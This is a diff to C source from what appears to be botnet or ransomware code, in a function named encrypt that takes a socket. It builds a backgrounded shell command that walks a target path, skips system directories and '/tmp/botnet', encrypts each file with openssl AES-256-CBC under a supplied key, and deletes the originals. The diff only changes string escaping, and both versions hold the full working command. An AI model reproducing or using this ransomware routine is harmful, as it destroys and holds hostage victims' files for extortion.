@@ -284,7 +284,7 @@ void encrypt(int sockfd,const char *filepath){
     char command[2048];
     snprintf(
         command, sizeof(command),
-        "find %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 -o -path /tmp/botnet \\) -prune -o -type f ! -name \"*.encrypted\" -exec sh -c 'openssl aes-256-cbc -a -salt -pbkdf2 -in \"$1\" -out \"$1.encrypted\" -k \"%s\" && rm -f \"$1\"' _ {} \\; > /dev/null 2>&1 &",
+        "find %s \( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 -o -path /tmp/botnet \) -prune -o -type f ! -name \"*.encrypted\" -exec sh -c 'openssl aes-256-cbc -a -salt -pbkdf2 -in \"$1\" -out \"$1.encrypted\" -k \"%s\" && rm -f \"$1\"' _ {} \; > /dev/null 2>&1 &",
         filepath, key
     );
     cmd.params[0] = strdup(command); // Add the command as the first parameter
